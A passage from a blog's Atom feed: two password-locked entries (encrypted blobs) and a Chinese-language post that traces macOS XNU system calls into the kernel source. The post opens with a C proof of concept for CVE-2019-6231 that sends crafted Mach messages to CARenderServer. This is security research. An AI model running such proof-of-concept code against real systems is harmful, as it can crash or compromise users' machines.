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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="IDA" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IDA/"/>
    
    
  </entry>
  
  <entry>
    <title>1amb4ck</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/</id>
    <published>2019-03-05T15:26:30.000Z</published>
    <updated>2019-03-06T02:47:23.041Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="me" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/me/"/>
    
    
  </entry>
  
  <entry>
    <title>XNU系统调用深度解析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU系统调用深度解析/XNU系统调用深度解析/</id>
    <published>2019-01-30T05:53:00.000Z</published>
    <updated>2019-03-05T15:30:52.474Z</updated>
    
    <content type="html"><![CDATA[<h3 id="XNU系统调用深度解析"><a href="#XNU系统调用深度解析" class="headerlink" title="XNU系统调用深度解析"></a>XNU系统调用深度解析</h3><blockquote><p>从一个函数分析到系统调用的内核实现</p></blockquote><h4 id="由一段POC而起"><a href="#由一段POC而起" class="headerlink" title="由一段POC而起"></a>由一段POC而起</h4><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;mach/i386/kern_return.h&gt;#include &lt;mach/mach_traps.h&gt;#include &lt;servers/bootstrap.h&gt;#include &lt;dirent.h&gt;#include &lt;sys/stat.h&gt;#include &lt;time.h&gt;#include &lt;dlfcn.h&gt;#include &lt;unistd.h&gt;typedef struct quartz_register_client_s quartz_register_client_t;struct quartz_register_client_s {        mach_msg_header_t header;        uint32_t body;        mach_msg_port_descriptor_t ports[4];        char padding[12];};typedef struct quartzcore_mach_msg quartzcore_mach_msg_t;struct quartzcore_mach_msg{        mach_msg_header_t header;        char msg_body[712];};uint64_t get_filesize(const char *fn){        struct stat st;        stat(fn, &amp;st);        uint64_t fsize = st.st_size;        return fsize;};int main(int argc, const char * argv[]) {        mach_port_t p = MACH_PORT_NULL, bs_port = MACH_PORT_NULL;        task_get_bootstrap_port(mach_task_self(), &amp;bs_port);        const char *render_service_name = &quot;com.apple.CARenderServer&quot;;        kern_return_t (*bootstrap_look_up)(mach_port_t, const char *, mach_port_t *) = dlsym(RTLD_DEFAULT, &quot;bootstrap_look_up&quot;);        kern_return_t kr = bootstrap_look_up(bs_port, render_service_name, &amp;p);        if (kr != KERN_SUCCESS) {                return -1;        }        printf(&quot;[*] Get service of %s successully!\n&quot;, render_service_name);        quartz_register_client_t msg_register;        memset(&amp;msg_register, 0, sizeof(msg_register));        msg_register.header.msgh_bits =        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) |        MACH_MSGH_BITS_COMPLEX;        msg_register.header.msgh_remote_port = p;        msg_register.header.msgh_local_port = mig_get_reply_port();        msg_register.header.msgh_id = 40202;  // _XRegisterClient        msg_register.body = 4;        msg_register.ports[0].name = mach_task_self();        msg_register.ports[0].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[0].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[1].name = mach_task_self();        msg_register.ports[1].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[1].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[2].name = mach_task_self();        msg_register.ports[2].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[2].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[3].name = mach_task_self();        msg_register.ports[3].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[3].type = MACH_MSG_PORT_DESCRIPTOR;        kr = mach_msg(&amp;msg_register.header, MACH_SEND_MSG | MACH_RCV_MSG,                                    sizeof(quartz_register_client_t), sizeof(quartz_register_client_t),                                    msg_register.header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                return -1 ;        }        mach_port_t context_port = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x1c);        uint32_t conn_id = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x30);        printf(&quot;[*] context_port: 0x%x, conn_id: 0x%x\n&quot;,context_port,conn_id);        char *crash_log = &quot;crash.data&quot;; //size is 736.        FILE *fp = fopen(crash_log, &quot;rb&quot;);        if(fp == NULL){                printf(&quot;fopen error!\n&quot;);        }        uint64_t fsize = get_filesize(crash_log);        void *msg_buf = malloc(fsize);        memset(msg_buf, 0, fsize);        fread(msg_buf, fsize, 1, fp);        quartzcore_mach_msg_t qc_mach_msg = {0};        qc_mach_msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;        qc_mach_msg.header.msgh_remote_port = context_port;        qc_mach_msg.header.msgh_id = 40002;        memset(qc_mach_msg.msg_body, 0x0, sizeof(qc_mach_msg.msg_body));        *(uint32_t *)(qc_mach_msg.msg_body + 0) = 0x1;  // Ports count        memcpy(qc_mach_msg.msg_body+4+12, msg_buf+0x1c+0xc, 736-0x1c-0xc);        *(uint32_t *)(qc_mach_msg.msg_body + 4 + 12 + 4) = conn_id;        kr = mach_msg(&amp;qc_mach_msg.header, MACH_SEND_MSG,736, 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                printf(&quot;[-] Send message failed: 0x%d\n&quot;, kr);                return -1 ;        }        return 0;}</code></pre><p>里面的macho函数<code>mach_msg()</code>到底后面执行到哪里？于是展开一段追踪</p><p>从ida的导入表中可以看到这个函数实现在libSystem.B.dylib 顺便说下，这个动态库实际上只是一层封装，里面导入了/usr/lib/system下面的动态库。</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 2.1    frame #0: 0x00007fff79299694 libsystem_kernel.dylib`mach_msglibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;: pushq  %rbp    0x7fff79299695 &lt;+1&gt;: movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;: pushq  %r15    0x7fff7929969a &lt;+6&gt;: pushq  %r14Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>调试可以看出mach_msg实现在libsystem_kernel.dylib之中</p><pre><code class="assembly">(lldb) dislibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;:   pushq  %rbp    0x7fff79299695 &lt;+1&gt;:   movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;:   pushq  %r15    0x7fff7929969a &lt;+6&gt;:   pushq  %r14    0x7fff7929969c &lt;+8&gt;:   pushq  %r13    0x7fff7929969e &lt;+10&gt;:  pushq  %r12    0x7fff792996a0 &lt;+12&gt;:  pushq  %rbx    0x7fff792996a1 &lt;+13&gt;:  subq   $0x28, %rsp    0x7fff792996a5 &lt;+17&gt;:  movl   %ecx, %r13d    0x7fff792996a8 &lt;+20&gt;:  movl   %esi, %ebx    0x7fff792996aa &lt;+22&gt;:  movq   %rdi, %r14    0x7fff792996ad &lt;+25&gt;:  movl   0x10(%rbp), %eax    0x7fff792996b0 &lt;+28&gt;:  movl   %ebx, %r12d    0x7fff792996b3 &lt;+31&gt;:  andl   $0xfffffbbf, %r12d        ; imm = 0xFFFFFBBF     0x7fff792996ba &lt;+38&gt;:  movl   %eax, (%rsp)    0x7fff792996bd &lt;+41&gt;:  movl   %r12d, %esi    0x7fff792996c0 &lt;+44&gt;:  movl   %edx, %r15d    0x7fff792996c3 &lt;+47&gt;:  movl   %r8d, -0x2c(%rbp)    0x7fff792996c7 &lt;+51&gt;:  movl   %r9d, -0x30(%rbp)    0x7fff792996cb &lt;+55&gt;:  callq  0x7fff79299170            ; mach_msg_trap    ...</code></pre><pre><code class="c">mach_msg_return_t __cdecl mach_msg(mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t rcv_size, mach_port_name_t rcv_name, mach_msg_timeout_t timeout, mach_port_name_t notify){  mach_msg_return_t result; // eax  mach_msg_option_t v8; // er12  result = mach_msg_trap();  if ( !result )    return 0;  if ( !(option &amp; 0x40) &amp;&amp; result == 268435463 )  {    do      result = mach_msg_trap();    while ( result == 268435463 );  }  v8 = option;  if ( !_bittest(&amp;v8, 0xAu) &amp;&amp; result == 268451845 )  {    do      result = mach_msg_trap();    while ( result == 268451845 );  }  return result;}</code></pre><p>通过调式和ida反汇编mach_msg函数可以看出，最终会调用mach_msg_trap这个函数，再跟一下</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 3.1    frame #0: 0x00007fff79299170 libsystem_kernel.dylib`mach_msg_traplibsystem_kernel.dylib`mach_msg_trap:-&gt;  0x7fff79299170 &lt;+0&gt;:  movq   %rcx, %r10    0x7fff79299173 &lt;+3&gt;:  movl   $0x100001f, %eax          ; imm = 0x100001F     0x7fff79299178 &lt;+8&gt;:  syscall     0x7fff7929917a &lt;+10&gt;: retq   Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>这个函数后面会调用0x100001f系统调用，可以小结得到系统库封装了最底层的实现，最终通过系统调用进入内核。在用户层到这里已经就到头了，无法再跟进。</p><h4 id="XNU内核系统调用流程"><a href="#XNU内核系统调用流程" class="headerlink" title="XNU内核系统调用流程"></a>XNU内核系统调用流程</h4><p>系统调用发生在内核之中，那么最开始处理系统调用的地方又在哪？通过<a href="http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html" target="_blank" rel="external">intel官方文档</a>可以找到</p><pre><code>SYSCALL invokes an OS system-call handler at privilege level 0.It does so by loading RIP from the IA32_LSTAR MSR</code></pre><p>也就是内核需要将系统调用处理函数入口放到<code>IA32_LSTAR</code> <a href="https://en.wikipedia.org/wiki/Model-specific_register" target="_blank" rel="external">model specific register</a>. 在内核源码中对应在<code>osfmk/i386/mp_desc.c</code>的<code>cpu_syscall_init(cpu_data_t *cdp)</code>函数之中</p><pre><code class="c">/* * Set MSRs for sysenter/sysexit and syscall/sysret for 64-bit. */voidcpu_syscall_init(cpu_data_t *cdp){#if MONOTONIC    mt_cpu_up(cdp);#else /* MONOTONIC */#pragma unused(cdp)#endif /* !MONOTONIC */    wrmsr64(MSR_IA32_SYSENTER_CS, SYSENTER_CS);     wrmsr64(MSR_IA32_SYSENTER_EIP, DBLMAP((uintptr_t) hi64_sysenter));    wrmsr64(MSR_IA32_SYSENTER_ESP, current_cpu_datap()-&gt;cpu_desc_index.cdi_sstku);    /* Enable syscall/sysret */    wrmsr64(MSR_IA32_EFER, rdmsr64(MSR_IA32_EFER) | MSR_IA32_EFER_SCE);    /*     * MSRs for 64-bit syscall/sysret     * Note USER_CS because sysret uses this + 16 when returning to     * 64-bit code.     */    wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));    wrmsr64(MSR_IA32_STAR, (((uint64_t)USER_CS) &lt;&lt; 48) | (((uint64_t)KERNEL64_CS) &lt;&lt; 32));    /*     * Emulate eflags cleared by sysenter but note that     * we also clear the trace trap to avoid the complications     * of single-stepping into a syscall. The nested task bit     * is also cleared to avoid a spurious &quot;task switch&quot;     * should we choose to return via an IRET.     */    wrmsr64(MSR_IA32_FMASK, EFL_DF|EFL_IF|EFL_TF|EFL_NT);}</code></pre><p><code>wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));</code>也就是系统调用会由<code>hi64_syscall</code>函数处理。这个函数实现在<code>xnu/osfmk/x86_64/idt64.s</code>之中</p><pre><code class="assembly">Entry(hi64_syscall)Entry(idt64_syscall)    swapgs     /* Use RAX as a temporary by shifting its contents into R11[32:63]      * The systemcall number is defined to be a 32-bit quantity, as is      * RFLAGS.      */    shlq    $32, %rax    or     %rax, %r11.globl EXT(dblsyscall_patch_point)EXT(dblsyscall_patch_point)://    movabsq    $0x12345678ABCDEFFFULL, %rax     /* Generate offset to the double-mapped per-CPU data shadow      * into RAX      */    leaq    EXT(idt64_hndl_table0)(%rip), %rax    mov    16(%rax), %rax    mov     %rsp, %gs:CPU_UBER_TMP(%rax)  /* save user stack */    mov     %gs:CPU_ESTACK(%rax), %rsp  /* switch stack to per-cpu estack */    sub    $(ISF64_SIZE), %rsp    /*     * Synthesize an ISF frame on the exception stack     */    movl    $(USER_DS), ISF64_SS(%rsp)    mov    %rcx, ISF64_RIP(%rsp)        /* rip */    mov    %gs:CPU_UBER_TMP(%rax), %rcx    mov    %rcx, ISF64_RSP(%rsp)        /* user stack --changed */    mov    %r11, %rax    shrq    $32, %rax        /* Restore RAX */    mov    %r11d, %r11d        /* Clear r11[32:63] */    mov    %r11, ISF64_RFLAGS(%rsp)    /* rflags */    movl    $(SYSCALL_CS), ISF64_CS(%rsp)    /* cs - a pseudo-segment */    mov    %rax, ISF64_ERR(%rsp)        /* err/rax - syscall code */    movq    $(HNDL_SYSCALL), ISF64_TRAPFN(%rsp)    movq    $(T_SYSCALL), ISF64_TRAPNO(%rsp)    /* trapno */    swapgs    jmp    L_dispatch            /* this can only be 64-bit */</code></pre><p>继续跟下去，会得到如下执行流程</p><pre><code>syscall--&gt;hi64_syscall-&gt;L_dispatch--&gt;ks_dispatch--&gt;ks_dispatch_user--&gt;L_dispatch_U64--&gt;L_dispatch_64bit--&gt;L_common_dispatch--&gt;hndl_syscall</code></pre><pre><code class="assembly">/* * 64bit Tasks * System call entries via syscall only: * *    r15     x86_saved_state64_t *    rsp     kernel stack * *    both rsp and r15 are 16-byte aligned *    interrupts disabled *    direction flag cleared */Entry(hndl_syscall)    TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movl    $-1, TH_IOTIER_OVERRIDE(%rcx)    /* Reset IO tier override to -1 before handling syscall */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    /*     * We can be here either for a mach, unix machdep or diag syscall,     * as indicated by the syscall class:     */    movl    R64_RAX(%r15), %eax        /* syscall number/class */    movl    %eax, %edx    andl    $(SYSCALL_CLASS_MASK), %edx    /* syscall class */    cmpl    $(SYSCALL_CLASS_MACH&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mach_scall64)    cmpl    $(SYSCALL_CLASS_UNIX&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_unix_scall64)    cmpl    $(SYSCALL_CLASS_MDEP&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mdep_scall64)    cmpl    $(SYSCALL_CLASS_DIAG&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_diag_scall64)    /* Syscall class unknown */    sti    CCALL3(i386_exception, $(EXC_SYSCALL), %rax, $1)    /* no return */</code></pre><p><code>hndl_syscall</code>这个函数会系统调用分为<code>hndl_unix_scall64</code> 、<code>hndl_mach_scall64</code>、<code>hndl_mdep_scall64</code>、<code>hndl_diag_scall64</code>四类分别处理</p><p>这里以<code>hndl_unix_scall64</code>为列</p><pre><code class="assembly">Entry(hndl_unix_scall)        TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    incl    TH_SYSCALLS_UNIX(%rcx)        /* increment call count   */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    sti    CCALL1(unix_syscall, %r15)    /*     * always returns through thread_exception_return     */</code></pre><p>这里调动了<code>unix_syscall</code>函数，这个函数在bsd/dev/i386/systemcalls.c之中实现，里面进行了一些权限检查</p><p>以及根据系统调用表去调用对应的实现</p><pre><code class="c">  thread = current_thread();  uthread = get_bsdthread_info(thread);  // regs is derrived from r15 ...  code = regs-&gt;rax &amp; 